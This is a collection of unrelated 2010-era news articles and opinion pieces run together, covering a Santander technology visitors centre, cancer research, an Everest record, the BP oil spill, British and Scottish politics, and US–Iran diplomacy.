Someone took all the stunning technological advancements of the past decade and actually made a building that looks like it belongs in the 21st Century .
“ El Faro ” , the lighthouse , is an interactive visitors center that features robots , augmented reality stations , huge tactile interface walls , and flowing LED lights .
It ’s like something out of Minority Report or Blade Runner .
Set on the massive 16 hectare compound of Santander Bank outside of Madrid , El Faro awes its guests with technology that transforms their surroundings into a interactive mesh of the physical and digital worlds .
I ca n’t adequately describe how awesome this place looks , so check out the video below instead .
Integrated technologies providing humans with an enhanced environment – welcome to the future , boys and girls .
Santander is one of the largest banks on the planet : third in profits , seventh in stock market capital .
They hired Portuguese company YDreams to create a unique entry point to their new compound outside of Madrid .
Something to awe visitors and demonstrate Santander ’s prestige .
Mission accomplished .
El Faro opens with a 30 meter glass cube surrounding an expansive walkway with trees covered in spiraling LED lights .
Guests are greeted by robot guides to take them to their destination .
I ’m impressed and I have n’t even been there yet :
There are four major technologies at work in El Faro .
The simplest is the LED light show that covers the space , giving visitors up to minute stock prices , as well as providing a shifting array of color .
The second piece of tech is a large ( 12 m ) interactive wall where users can guide the visuals they see through touch .
It ’s not the biggest touchscreen we ’ve seen , or even the most fun , but it looks great and really fits in with the surroundings as a whole .
The third technology is autonomous robot guides .
The Santander Interactive Guest Assistants ( SIGA , “ follow ” in Spanish ) are designed to escort visitors .
When you arrive at El Faro , a totem stand allows you to select your language and destination .
A SIGA robot will then approach you and lead you while providing ambient music .
The bots use RF tags , gyroscopes , and odometers to determine their position and 16 sonar sensors let them locate objects ( such as the human they are guiding ) while they move .
They can run for 6 hours on their battery and know when and how to recharge themselves when drained .
Except for input at the totem station , SIGA bots work completely autonomously .
All that and they look like the light cycles from Tron.
Slick .
Finally , El Faro features a great use of augmented reality .
A large 3D model of the 16 hectare Santander complex is displayed on a table .
Four moving touchscreens slide along the table providing enhanced views of the compound .
Lasers help each screen know their position and exactly what a user wants to see .
Look through a screen and you get a view of much more than the buildings in the model , you can explore related information , videos , and architectural features .
It ’s a great use of AR to merge real and virtual objects and data .
YDreams has only been around for ten years , but I think their work at El Faro demonstrates their expertise .
It ’s not that any one of these technologies is years ahead of the competition , in fact we ’ve seen all of them before .
The true genius lies in integrating all of these cutting edge multimedia experiences into one space and with one uniting vision .
This is what 21st century design should look like .
The space is dynamic , it ’s interactive , and it ’s useful .
El Faro is an example of what every office building lobby could look like in the years ahead .
Eventually , this sort of tech could be integrated into all of our homes as well .
As each of these individual techs ( AR , robotics , human computer interfaces ) develop , the possibilities will get better and better .
Maybe I should n’t call El Faro a “ 21st Century building ” … maybe I should call it a “ 2010 building . ”
In another decade we ’ll have the means to make this space look positively archaic .
We ’re moving towards a world where the physical and digital will merge into one environment .
This is a great step in that direction .
The next one is sure to be even more mind - blowing .

Vitamins and calcium supplements appear to reduce the risk of breast cancer , according to findings presented at the American Association for Cancer Research 101st Annual Meeting 2010 .
" It is not an immediate effect .
You do n't take a vitamin today and your breast cancer risk is reduced tomorrow , " said Jaime Matta , Ph.D. , professor in the Ponce School of Medicine in Puerto Rico .
" However , we did see a long - term effect in terms of breast cancer reduction . "
Matta said the findings suggest that the calcium supplements are acting to enhance DNA repair capacity , a complex biological process involving more than 200 proteins that , if disrupted , can lead to cancer .
" This process involves at least five separate pathways and is critical for maintaining genomic stability , " said Matta .
" When the DNA is not repaired , it leads to mutation that leads to cancer . "
The study included 268 women with breast cancer and 457 healthy controls .
Women were more likely to have breast cancer if they were older , had a family history of breast cancer , had no history of breastfeeding and had lower DNA repair capacity .
Vitamin supplements appeared to reduce the risk of breast cancer by about 30 percent .
Calcium supplements reduced the risk of breast cancer by 40 percent .
After controlling for the level of DNA repair capacity , calcium supplements were no longer as protective , but the link between vitamin supplements and breast cancer reduction remained .
" We 're not talking about mega doses of these vitamins and calcium supplements , so this is definitely one way to reduce risk , " said Matta .

KATHMANDU ( Reuters ) - A 13 - year - old American boy on Saturday became the youngest climber to conquer Mount Everest , the world ’s highest mountain , a climbing website said .
Jordan Romero from Big Bear , California , scaled the 8,850 meter ( 29,035 feet ) summit from the Tibetan side , on the same day a Nepali man broke his own world record for the most number of successful Everest attempts .
“ The team has just called in and confirmed that they are standing on top of Mt. Everest , ” Romero ’s blog said .
“ Their dreams have now come true .
Everyone sounded unbelievably happy . ”
The ascent has put Romero one step closer to reaching his goal of climbing the highest mountains on all seven continents .
“ It is just a goal , ” Romero had told Reuters in the Nepali capital Kathmandu in April .
He had already climbed five peaks including Mount Kilimanjaro in Africa , and needs to climb only Vinson Massif , the highest peak in Antarctica to hit his target .
The previous youngest person to summit Everest was 16 - year - old Temba Tsheri Sherpa of Nepal .
Slideshow ( 3 images )
Romero was accompanied by a team including his father Paul , a critical care paramedic , and Sherpa guides .
He told Reuters wanted to pick a small piece of rock from the top of the world as a memento and wear it in a necklace .
His next mission is to climb the highest mountains in all 50 states in the United States .
More than 4,000 climbers have reached the top of Mount Everest since it was first climbed by New Zealander Sir Edmund Hillary and Nepal ’s Tenzing Norgay Sherpa in 1953 .
Nepali mountaineer Apa Sherpa broke his own record and climbed Mount Everest for the 20th time , said Ang Tshering Sherpa , chief of the Asian Trekking Agency .
Apa , 50 , who lives in the United States , reached the summit on Saturday along the Southeast Ridge route .
He carried a banner all the way to the summit to raise awareness of the environmental impact of climate change on the Himalayas .
“ It is a fantastic achievement by one individual , ” said Elizabeth Hawley , who chronicles major climbs in the Himalayan mountain range .
“ Going back year after year after year and succeeding each time is really amazing . ”

Sergeant Matthew Gildea , of the Bendigo sexual offences and child abuse unit , said sexting among teenagers was out of control , with children as young as 12 involved .
The film , Photograph , made in the regional town of Bendigo with local students , will be shown at a national conference on children 's privacy to be held in Melbourne on May 21 .
" The use of mobile phones to take these images just highlights how new technologies are making children more and more vulnerable , " Victorian Privacy Commissioner Helen Versey said .
She said the conference would discuss sexting , cyber - bullying and online safety , as well as issues such as whether children had the capacity to consent to an organisation using or disclosing their personal information .
" Children are confiding and communicating with their friends online and do n't realise the potential for that information to be picked up by others , " Ms Versey said .
" We do n't want to stop them using the internet and social networking sites but we want them be conscious of what .
. . the consequences might be . "
Sergeant Gildea said anecdotal evidence suggested the number of teenagers sexting was soaring and he believed the film should be shown in every high school .
" You can hear a pin drop in the room when the video is playing because the kids relate to it , " he said .
The film shows what happens when a 15 - year - old girl agrees to send a sexually explicit photograph of herself to her boyfriend , and then he distributes it after they break up .
The Victoria Education Department plans to provide a link on its website for schools wanting to obtain a copy of Photograph .
Cardinal Keith O'Brien insists he is not endorsing one party over another , despite attacking policies introduced or supported by Whitehall

Scotland 's Catholic bishops have entered the election campaign by urging voters to back candidates that oppose gay adoption and marriage , embryo research , abortion and assisted suicide .
Today , the bishops issued a statement to all 500 Catholic parishes in Scotland suggesting worshippers press their local candidates to answer a questionnaire on these issues .
Catholics will be asked to consider " which candidate will best respect and protect your religious freedom and your freedom of conscience ? "
Cardinal Keith O'Brien , the morally conservative and outspoken president of the bishops ' conference , who released their joint statement , insisted today he is not endorsing one party over another .
" It is crucially important that apathy is not allowed to win in this election , I hope Catholic voters will make the cross count by quizzing their candidates on the important moral matters which affect us , " he said .
However , the majority of policies under attack are ones introduced or supported by the UK government , although Labour ministers agree with Catholic leaders on the need to scrap the bar on Catholics marrying a monarch or being crowned , and also on tackling poverty .
O'Brien has repeatedly clashed with Labour , accusing the party of betraying core Christian values by supporting gay adoptions , genetic research on embryos and by refusing to restrict abortions .
Bishop Joseph Devine , the bishop of Motherwell , has accused Labour of " violating moral law " .
In a statement issued today , the bishops ' claim these policies are alien to Catholics , and argue our parents and grandparents " would never have voted for candidates who were clearly hostile to the values they held dear " .
It adds : " As Catholics , we know the importance of protecting every human life and of the value that married family life gives to society .
" These values were once widely shared , but times have changed .
Many of those standing for election , of whatever party , do not share our basic principles and values .
" That is why we say to you : when you vote , make your faith count .
Vote with your faith to protect human life ; to support marriage and the family ; to protect religious freedom ; to protect Catholic education .
" Vote with your faith , and uphold the right of conscience and religious freedom . "
The bishops ' stance puts Jim Murphy , the Scottish secretary , in an awkward position and opens up the Catholic church to charges of favouring other parties .
Murphy , a practising Catholic who routinely invites O'Brien to government functions in Scotland , has struggled to placate O'Brien .
But with the Catholic vote seen as critical in some Labour - held constituencies , the Scottish National party has meanwhile been carefully courting the cardinal .
It emerged last year that the SNP government in Edinburgh had secretly lobbied UK ministers to drop plans to make it illegal for an adoption agency – including Catholic organisations – from allowing same sex couples to adopt or foster .
Alex Salmond , the first minister , also supports lowering the time limit for abortions .
On a campaign visit in Edinburgh North and Leith this morning , Murphy suggested voters would have much wider concerns than the specific issues raised by the bishops .
O'Brien agreed that voters were entitled to think for themselves , he said .
" I welcome the fact that the cardinal is trying to encourage debate about the election , and the big issues of the election are moral issues , economic issues and international issues .
But individuals make their own minds up about what 's important for them , their values , their life experiences , their family and their country , " he said .
All the main parties , with the exception of the Tories , are thought to have allowed their candidates to respond .
Frank Roy , Labour 's campaign manager , said the survey was already being circulated to all its candidates and added that on many of these issues , there had been free votes in the Commons .
" We 've forwarded the survey but it 's up to candidates how to respond , " he said .
" These are important issues for many people in the election ; there 's no disputing that . "

Traces of chemicals known to cause human cancer lurk everywhere .
But after decades of research , figuring out how many people might contract cancer because of them remains an elusive goal .
More than 60 percent of U.S. cancer deaths are caused by smoking and diet .
But what about the rest ?
A report by the President 's Cancer Panel , released earlier this month , reignited a 30 - year - old controversy among cancer experts and environmental epidemiologists about how large a role environmental factors play in the No. 2 killer of Americans .
Some experts , including the President ’s panel , say a decades - old estimate that six percent of cancer deaths are due to environmental and occupational exposures is outdated and far too low .
But scientists most likely will never be able to tease out the true role of environmental contaminants because environmental exposures , genetics and lifestyle seem to all intertwine .
“ It ’s like looking at strands of a spider web and deciding which one is important , ” said Dr. Ted Schettler , director of the Science and Environmental Health Network , a nonprofit group that advocates use of science in setting environmental policy .
From the womb to old age , people around the world are exposed to countless carcinogens in their food , air , water and consumer goods .
The National Institutes of Health has classified 54 compounds as known human carcinogens based on studies indicating they cause at least one type of cancer in people , according to the nation ’s 11th Report on Carcinogens .
The highest exposures occur in an occupational setting , but there are environmental exposures as well .
For example , benzene , a known cause of human leukemia , is a common pollutant in vehicle exhaust .
Radon , a natural radioactive gas found in many homes , raises the risk of lung cancer .
Arsenic , linked to skin , liver , bladder and lung cancer , contaminates some drinking water supplies .
Other known human carcinogens include asbestos , hexavalent chromium , aflatoxins and vinyl chloride .
Since 1981 , agencies and institutes have cited the same estimate when regulating carcinogens in the workplace , air , water and consumer products .
Roughly four percent of cancer deaths – or 20,000 deaths per year - may be attributable to occupational exposures , and two percent – or 10,000 deaths per year – to environmental exposures .
In its new report , the panel , appointed by former President Bush , called that estimate “ woefully out of date , ” reporting that “ the true burden of environmentally induced cancers has been grossly underestimated . ”
But the American Cancer Society took issue with that statement , saying there was no scientific consensus .
“ On what grounds do you know it 's being grossly underestimated ?
It 's a possibility , but many hypotheses have been proposed , and unless you have real evidence , you ca n’t say that it is , ” said Dr. Michael Thun , vice president emeritus of epidemiology and surveillance research for the American Cancer Society .
Thun said the President ’s panel overstates the concern about environmental causes when the best way to prevent cancer is to combat the largest risks that people encounter : tobacco , diet and sun .
But many environmental epidemiologists say quibbling over the numbers becomes a diversionary tactic .
They say the American Cancer ’s Society ’s statement sounds a bit like a principle espoused by industry groups – do n’t act without absolute proof of harm .
Many environmental epidemiologists are in favor of moving toward the precautionary principle – reducing people ’s exposure to environmental pollutants even if there is uncertainty about the risks .
It ’s an " erroneous exercise ” to try to assign each chemical or exposure a specific fraction of cancer , said Richard Clapp of Boston University 's School of Public Health , who co-authored a 2005 review and 2007 update on environmental and occupational causes of cancer .
" It 's estimating a fiction , because nobody knows and nobody can know , " said Clapp .
" Why do we keep beating this dead horse ?
If there are things we can move on , let 's work on those . "
Cancer is the second leading killer of Americans , and the leading cause of death worldwide .
Every year , about 1.5 million new cases are diagnosed in the United States and more than half a million people die from the disease , according to the American Cancer Society .
Experts agree that most cancers are caused by lifestyle factors such as smoking , diet and alcohol .
Smoking alone accounts for at least 30 percent of all U.S. cancer deaths , and another one - third is attributed to diet , obesity and physical inactivity , according to the American Cancer Society .
But it ’s the remaining cancers – about one out of every three – that trigger debate .
A 1981 report by two scientists , Sir Richard Doll and Sir Richard Peto , published in the Journal of the National Cancer Institute , estimated that two percent of cancer deaths were attributable to exposures to pollutants in the environment and four percent to exposures in occupational settings .
In 2009 , those percentages amounted to about 30,000 U.S. deaths .
“ If you looked at the number of deaths per day , if that were a plane crash it would be a national news story , ” Clapp said .
The 1981 report only considered deaths , not cancer cases .
( About half of those diagnosed with cancer die . )
Also , the study only included Caucasians under the age of 65 , although many cancers increase with age and many minority groups are more highly exposed to environmental contaminants .
The old two percent estimate for environmentally induced cancers is still commonly used – despite advances in modern cancer biology .
New areas of cancer research are focusing on the potential for pollutants to interact with one another and with genetic factors .
Carcinogens can act by damaging DNA , disrupting hormones , inflaming tissues , or switching genes on or off .
Also , exposure to hormonally active agents during critical periods of human development – particularly in the womb or during childhood – may trigger cancer later in life .
For example , the risk of breast cancer could be influenced by exposures during puberty .
All these elements make it tricky to calculate the magnitude of environmentally induced cancers .
Scientists now know that getting cancer is like being attacked by a multi- headed monster :
How can you really be sure which part did the most damage ?
Schettler said “ we now know from cancer biology that multiple interacting factors ” are involved so it ’s impossible to assign percentages to certain causes .
“ It ’s really important that we understand the limits of this notion .
We have to be humbled by this and know that our estimates may be way off , ” he said .
Margaret Kripke , a professor at University of Texas ' M.D. Anderson Cancer Center and co-author of the President ’s Cancer Panel report , said the idea that cancer biologists can put a number on the environmental component of cancer is fraught with limitations .
She uses the example of a person who is genetically predisposed to lung cancer , but also smokes and lives in an area with high air pollution .
If this person develops cancer , it is almost always attributed to smoking because almost 90 percent of lung cancer deaths are caused by tobacco .
But researchers can't simply dismiss the remaining 10 percent .
The way these fractions are teased apart is crucial , and important contributors are easily overlooked by limitations in study design .
There is substantial evidence that synergism between two different exposures can cause some cancers .
Asbestos , for example , enhances the carcinogenicity of tobacco smoke , so the rate of lung cancer was especially high among people who smoked and also were exposed to asbestos in their workplaces .
The major reason that it ’s so difficult to pin down how many cancers are due to environmental factors is that studies that allow epidemiologists to link human cancers to an environmental pollutant are rare opportunities .
Scientists need a setting where they can be absolutely certain about what and when people were exposed to something , and then be able to follow up with the patients many years later , since cancer takes decades to develop .
Yet this is hardly ever possible , said Dr. Richard Jackson , former director of the federal Centers for Disease Control and Prevention ’s National Center for Environmental Health .
Humans are n't lab rats ; they tend to move around , so they do n't know what they were exposed to , said Jackson , who is now a UCLA professor .
Also , tracking systems for environmental exposures and chemicals are inadequate .
Smoking is relatively easy to study – you can ask someone about their smoking habits – but if you ask someone if they were exposed to benzene , chlorinated solvents , or pesticides , they probably wo n’t have the slightest idea or they certainly wo n’t know how much they were exposed to , Schettler said .
There are examples of natural experiments where communities have banned a suspected carcinogen such as a pesticide and then seen cancer rates drop , such as when Sweden banned phenoxy herbicides over a decade ago .
While these natural experiments are useful to epidemiologists , they usually only confirm that a chemical is harmful and reveal little about its overall contribution to cancer death .
In most cases , environmental agencies estimate the number of cases attributable to a certain environmental chemical by extrapolating from studies of lab animals or occupational settings where cancer rates rise among workers , then estimating the public ’s exposures .
But those risk assessments carry many uncertainties .
The two members of the President ’s Cancer Panel believe their claim about the “ grossly underestimated ” role of the environment is justified because technologies such as CT scans , which expose people to large amounts of radiation , are in greater use today .
Also , there are more known carcinogens today , and the original estimates did n't consider multiple exposures over a person ’s life .
“ We think all of those things combine to make the current estimate higher .
They certainly wo n't go down , but are probably much larger than estimated , ” said Kripke .
She said the panel ’s intent was to bring attention to human carcinogens in the environment that the public is unaware of , such as radon and formaldehyde , she said .
The panel pointed out bisphenol A , used in polycarbonate plastic and can linings , along with radon , formaldehyde and benzene , as carcinogens that need more regulation .
Clapp said instead of worrying about specific numbers , the focus should be on banning or restricting workplace carcinogens with strong evidence that they are harmful .
One example is methylene chloride , used in semiconductor factories .
Reducing use of CT scans and cleaning up military bases are other ways to reduce exposures , according to the President ’s Cancer Panel report .
The American Cancer Society agreed with much of the panel ’s report , and in the past , it has expressed concern about environmental chemicals .
“ Although the relatively small risks associated with low - level exposure to carcinogens in air , food , or water are difficult to detect in epidemiological studies , scientific and regulatory bodies throughout the world have accepted the principle that it is reasonable and prudent to reduce human exposure to substances shown to be carcinogenic at higher levels of exposure , ” the American Cancer Society said in a 2009 Cancer Facts and Figures report .
But the group worries that the President ’s Cancer Panel overstated the risks and detracts from combating the bigger causes of cancer .
“ There is no doubt that environmental pollution is an important issue to address to improve the lives of Americans .
At the same time , it would be unfortunate if people came away with the message that the chemicals in the environment are the most important cause of cancer at the expense of those lifestyle factors , like tobacco , physical activity , nutrition , and obesity , that have by far the most potential in reducing cancer deaths , ” Thun said in a statement .
Thun added in an interview that “ many of the carcinogens in smoking are the same ones that people worry about in the general environment , ” such as benzene .
But in cigarettes , “ they are much more concentrated and people are inhaling them deep into their lungs .
The magnitude of exposure is just gigantically different . ”
But Kripke pointed out that there has been plenty of emphasis on smoking , diet and other causes of cancer over the past few years .
Last year ’s 2009 President ’s Cancer Panel report focused on lifestyle - related cancers .
" To say that we have ignored those factors does n't take into account that we have put a lot into work into it , ” Kripke said .
" We 're very cognizant that there are other , larger factors that contribute to cancer , but that does n't mean we should n't look at the smaller ones . ”
The general public can understand that many factors can lead to disease and that all should be addressed , Schettler said .
“ People can walk and chew gum at the same time .
We can pay attention to many factors at the same time , ” he said .

US oil industry watchdog to be broken up
Experts fear the oil could cause an ecological disaster
The US is to break up a federal oil industry watchdog - amid conflict of interest fears - following the Gulf of Mexico oil spill disaster .
Interior Secretary Ken Salazar unveiled the plans to split up the Minerals Management Service , which both inspects rigs and collects oil royalties .
Oil executives have been passing blame , as they were grilled at a Senate hearing into the spill , amid protests .
President Barack Obama says he is " frustrated " the leak is not plugged .
British firm BP will make a second attempt this week to seal the oil well .
An attempt to drop a huge box on to the leak failed at the weekend and BP will now try to cap it with a smaller box .
MARDELL'S AMERICA
There 's been plenty of technical detail in Washington as three companies try to explain what went wrong ...
In simple language it's a blame game

The energy giant is also expected to try to plug the well using rubbish like tyres and golf balls .
Oil executives were met by angry protesters as they attended a congressional hearing into the disaster on Tuesday .
Senate energy committee chairman Jeff Bingaman said at the outset it was important to remember the 11 lives lost in the disaster .
He added : " The sobering reality is that despite the losses and damage that have already been suffered , we do not yet know what the full impact of this disaster will be . "
Blame game The Deepwater Horizon rig that blew up in the Gulf of Mexico on 20 April was owned and operated by drilling firm Transocean , but leased by BP .
The head of BP America told the Senate hearing he had reason to believe a critical safety device called a blowout protector had been modified , reports news agency Reuters .
Lamar McKay also noted the 450 - tonne device was owned by Transocean .
I hear one message - do n't blame me
Sen John Barrasso
Senate Energy Committee
Bayou fishermen's wait goes on But Transocean 's boss said there was no reason to believe its blowout protector had been at fault , as he pointed the finger at BP .
" Offshore oil and gas production projects begin and end with the operator , in this case BP , " said chief executive Steven Newman .
He also pinned blame on the failure of a cement oil - well casing , built by BP contractor Halliburton .
But Halliburton executive Tim Probert argued his firm had followed all requirements set out by BP and industry practices .
Senator John Barrasso said : " I hear one message - do n't blame me .
Shifting the blame game does n't get us very far . "
A separate hearing into the oil disaster was being held on Tuesday by the Senate environment committee .
Sex and drugs Meanwhile , Interior Secretary Salazar announced plans to split up the Minerals Management Service ( MMS ) , which critics say is riddled with conflicts of interest .
ATTEMPTS TO CONTROL SLICK
Booms have been partly successful although rough seas have washed oil over them Some controlled burning of oil has taken place , but it causes serious air pollution About 325,000 gallons of dispersant have been used , although scientists warn it may kill marine life A relief well is being drilled but could take many weeks A huge steel funnel suffered a build - up of ice - like crystals and had to be put aside
In maps : Fighting the slick Critics say the agency 's two core responsibilities are diametrically opposed - making money off the industry by collecting royalties , while also cracking down on it in ways that may affect the industry 's bottom line .
Announcing the proposed split of the MMS , Mr Salazar said it was important to ensure " a strong and independent organisation holding energy companies accountable " .
A 2008 interior department investigation found some MMS employees took drugs and had sex with energy company representatives .
Some staff had also accepted gifts and free holidays , amid " a culture of ethical failure " , according to the investigation .
The interior secretary has also been conducting a 30 - day review of offshore drilling , at the request of President Barack Obama .
BP and US officials have been desperately trying to seal the damaged oil well , which is gushing 5,000 barrels ( 210,000 gallons ) a day into the sea .
The broken pipe is almost a mile ( 1.6 km ) below the ocean 's surface , with little visibility for remote - controlled vehicles .
A sheen from the slick is surrounding island nature reserves off Louisiana , and tar balls have reached the Alabama coast .

A History of Video Game Voiceovers
Voiceovers in video games have come a long way in the past few decades .
In the early 1980s , the Intellivision console — an early competitor of the Atari 2600 — introduced Intellivoice .
Intellivoice was a voice synthesis device to be used with revolutionary speech - supporting games , but it did not sell well and was phased out after only a few years .
In 1983 , Disney released the iconic laserdisc arcade game “ Dragon ’s Lair , ” which featured some of the first human voices on a video game .
Due to a very limited budget , the voiceovers were provided by the game ’s developers and animators rather than professional actors .
Over time , video games added more and more dialogue , which became less of a novelty and more of an essential plot point .
The year 2000 saw the release of “ Seaman ” for Sega Dreamcast featuring the voiceover talents of famed actor Leonard Nimoy , and “ Hey You , Pikachu ! ” for Nintendo 64 , which included relatively sophisticated voice recognition technology that allowed players to give voice commands to characters .
The characters were even able to respond with appropriate dialogue .
I 'm sorry but Gawker , you as a whole are simply quite ignorant when it comes to who is actually at fault in this entire mess .
Sure , I think BP should pay for the cleanup , as they are the leasholding company , however they are not the only operators here , and the Federal government had regulators that utterly failed to do their job , while they surfed for porn and had drinking games on the taxpayer and BP 's dime .
Halliburton built some of the hardware that failed .
TransOcean owns and operates the rig .
BP is the leaseholder paying for the operation .
All these parties are somewhat responsible for what happened .
I 'm not saying we should let BP off the hook as they are the leaseholder of the rig .
However I do think that Gawker 's populist streak has come out with a vengeance in this whole matter , and quite frankly I find the lack of journalistic rigor with which you guys cover this matter quite tiresome .
You guys are even more pathetic than the cable news channels when it comes to coverage on this .
What 's sad is that maybe you guys do know better .
But your audience is comprosed of clueless 15 - 25 year olds who are either too stupid or simply do n't want to understand that most of the time life is much more complex than what their oversimplified populist view of the world can process .
In our first leader of 2010 we argued that , at the coming general election , it may fall to Nick Clegg and the Liberal Democrats to resolve the historic " progressive dilemma " in British politics .
This was to say that a hung parliament - the likelihood of which has increased , not receded , since the Conservatives ' lead in the opinion polls began to narrow shortly before Christmas - offers the prospect of a realignment of progressive politics in this country and the establishment of a left - liberal coalition on a common programme of wide - ranging constitutional and economic reform .
That prospect remains tantalising for those of us who recognise that a new politics is required to deal with the convulsions of the past 18 months .
Anthony Barnett , launching a series of essays on the future of progressive politics on page 22 , argues that progressives need to " help Britain vote out New Labour " .
But , in truth , the New Labour " project " is already dead , fatal blows having been administered to it by the financial meltdown and the disgrace of MPs ' expenses .
Gordon Brown seems to understand this - as is evidenced by his reconversion to something like Keynesianism following the crash of autumn 2008 ( seemingly vindicated by new figures showing a drop in unemployment ) , and his belated recognition of the merits of electoral reform ( albeit in the watered - down guise of the Alternative Vote system ) .
Moreover , as David Marquand points out in his response to Mr Barnett on page 28 , David Cameron , by contrast , grasps neither the role played by deficit finance in a recession nor the pressing need to overhaul Westminster institutions that are both discredited and dysfunctional .
To suggest , as Mr Barnett comes close to doing , that Labour would benefit from the purgative effects of defeat - not something we endorse - is to underestimate the damage that would be wrought by an anti-Keynesian and Europhobic Conservative government .
What of Mr Clegg and the Lib Dems ?
When the Prime Minister committed Labour to holding a referendum on voting reform , he invited progressive politicians from all parties to join him in fixing our broken political system .
Mr Clegg , however , appears determined to resist the entreaties of other parties , preferring instead to sustain the elaborate ballet of " equidistance " - at least , until after the election .
A degree of reticence on the Lib Dems ' part is understandable .
We have been here before - in 1997 , for example , when Tony Blair 's blandishments to the then Lib Dem leader , Paddy Ashdown , stopped abruptly once an unfair voting system had delivered a grossly inflated parliamentary majority to Labour .
That was a missed opportunity for progressive politics , as Mr Ashdown and the Lib Dems would no doubt have functioned in government as New Labour 's good conscience , ensuring that constitutional reform would have been thoroughgoing rather than half - baked .
What the experience of the past 13 years shows is that progressive realignment in one party , like socialism in one country , does n't work .
There has always been a reactionary and tribal strain inside Labour that is hostile to pluralism and co-operation with other parties .
It is embodied today by the Prime Minister 's most unswerving supporters and henchmen : bruisers such as Charlie Whelan , now back in the spotlight as the political director of Unite , the powerful union co-ordinating the strike of British Airways cabin crew .
This is the ugly side of Labour .
But , at its best and boldest , when least insular and fearful , Labour has been a genuine party of ideas , open to outside influences and prepared to enter into transformative alliances .
If it remembers this , its future need not be bleak .
Movies are both an art form and a business , so while it 's the artist 's vision that dictates the direction , it is sadly entirely up to clean shaven men with business degrees to decide how to sell it .
And while we understand it 's their job to twist the truth to maximize a movie 's appeal , sometimes they go completely insane and just start making shit up .
Occasionally , they hit on a better idea than the movie ever did ...
... but mostly it 's just this kind of crap :
If Washington thinks it now faces complications on getting United Nations Security Council sanctions against Iran , that ’s not the half of it .
A greater obstacle is the subtle change introduced into international power relationships by the actions of Brazil and Turkey that has accompanied it .
These two medium - size powers , Brazil and Turkey , have just challenged the guiding hand of Washington in determining nuclear strategy towards Iran .
They undertook their own initiative to persuade Iran to accede to a deal on the handling of nuclear fuel issues .
Not only was that initiative entirely independent , it moved ahead in the face of fairly crude American warnings to both states not to contemplate it – even though it closely paralleled one offered to Iran last year that fell through , mainly due to Iranian maneuvering and its fundamental distrust of Washington ’s intent and blustering style .
Adding insult to injury , Brazilian President Luiz Inácio Lula da Silva and Turkish Prime Minister Recep Tayyip Erdogan both had the temerity to actually succeed in their negotiations with Iran while Washington was publicly predicting their certain ( and hoped for ) failure .
Are the Iranians simply engaging in another con game , playing for time – a maneuver at which they excel ?
Or has something more profound taken place ?
First , it is not only the terms of the deal that matter , but the messengers and atmospherics .
Washington for decades has dealt with Iran – almost always indirectly – with considerable truculence and belligerence as the background music to “ negotiations . ”
This is business as usual – the world ’s sole superpower demanding others to agree to its strategy of the moment .
When Mr. Lula and Mr. Erdogan came to Tehran , the game was entirely different .
It was n’t the content so much as the negotiators , the venue , and the atmospherics .
Tehran did not feel this time that it was acceding to superpower pressure , but to a reasoned and respectful request by two significant peer states in the world with no record of imperialism in Iran .
In one sense , the deal was almost bound to succeed .
What Iran wants as much as anything in this world is to blunt US dominance of the international order , and especially its ability to dictate terms in the Middle East .
If Iran is to yield at all on nuclear policy , what better device than to accede to two respected and successful states that were themselves defying Washington ’s wishes in even attempting negotiations ?
If Tehran had refused that offer , it might have torpedoed the very concept of independent alternative , non-American efforts in international strategy .
It made all the sense in the world for Iran to say “ yes ” this time to this combination of approach .
The same goes for China and Russia .
After the Lula - Erdogan success , US Secretary of State Hillary Clinton immediately proclaimed her own success at garnering Russian and Chinese support for enhanced sanctions against Iran – a stunningly insulting response to the remarkable accomplishment of Brazilian and Turkish negotiation .
These states are , after all , immensely important to US regional and global interests .
To blow them off like that was a major blunder , not just in terms of Iran , but in broader global strategy .
The rest of the world has surely taken further negative note that Washington ’s game remains depressingly familiar .
But do we really believe Clinton has in fact garnered Russian and Chinese support ?
Just as Tehran had every incentive to accept a proposal from “ equals , ” offered with respect instead of bluster and threats , so too Russia and China have every reason to welcome this initiative from Brazil and Turkey .
Yes , the terms of the agreement do matter somewhat , but what is far more important for them is the slow but inexorable decay of US ability to deliver international diktats and to have its way .
This is what Chinese and Russian foreign - policy strategy is all about .
Neither of these countries will , in the end , permit the US hard - line approach to win out over the Brazilian - Turkish one in the Security Council , even if the Brazilian - Turkish deal requires a little tweaking .
Russia and China champion the emergence of multiple sources of global power and influence that chip away at dying American unipolar power .
China and Russia , of course , represent the alternative polarity in the emerging struggle to end American hegemony in international affairs .
But of greater moment , they now witness the political center in international politics shifting away from Washington as well .
These two countries that defied American wishes are not just some Third World rabble - rousers scoring cheap points off the US .
They are two major countries that are supposedly close friends of the US This makes the affront even crueler .
These events are profound signs of the times .
The problem with unipolar power is that without checks and balances it invariably becomes subject to error and foolishness .
On occasion , Americans actually believe in checks and balances when it comes to our own Constitution .
Microsoft may be a great corporation , but nobody wants it to have a monopoly on IT .
Similarly in the world , international checks and balances are valuable safety valves .
When Washington moves into its fourth decade of paralysis and incompetence in handling Iran , still unable even to speak to it – just as it cannot bring itself to talk to Cuba after 50 years – it has exacerbated the problem , strengthened Iran and the forces of radicalism in the Middle East , polarized emotions and , worst , failed in all respects .
Should n’t the world welcome the actions of two significant , responsible , democratic , and rational states to intervene and help check the foolishnesses of decades of US policy ?
That is what checks and balances are all about and why the center is shifting .
And , who knows ?
“ Rogue states ” – a term beloved in Washington in reference to recalcitrant countries that do n’t toe the Washington line – may more readily come to accede to new approaches free of the old imperial techniques of interventionism and ultimatums .
Meanwhile , the US is rapidly running the risk of becoming its own “ failed state ” in terms of being able to exercise competent and effective international leadership since the fall of the Soviet Union .

Maybe someone will investigate this a little better and give us some more information .
I hope that this does n't end here .
Corner High School is a predominately white high school in the northwestern part of Jefferson County , ( Birmingham ) going towards Jasper .
I 've lived in Jefferson County nearly all my life and I 've never been to Corner .
I searched the school website and could not find any more information or determine who the geometry teacher might be as it appears this site has not been updated in some time or ever .
There are so many different ways you can teach angles and using an example of killing anyone is never appropriate .
Let 's make sure that the standards are the same for this teacher as it would be if the example were of a white President .
If this were in a predominately African American school or a more demographically diverse school would we see more outrage from the parents .
Do double standards apply ?
Do we even have to try and answer that question ?
Again we have limited information about this teacher and I hate to jump the shark .
However , this is not something that should be tolerated especially in the current environment of hate that is being brewed across this country .
Enough is enough .
Two people have been killed after three explosions rocked a black powder gun factory in northern New Hampshire Friday afternoon , officials say .
The explosion occured at the MDM Muzzleloader plant in Colebrook , N.H. , a town of roughly 2,000 residents near the Vermont border .
Mishel Fenn , who works at an inn nearby , told the Associated Press her building shook in the initial blast and that black smoke continued to spew from the building .
Fenn said nearby buildings were being evacuated and streets were being closed .
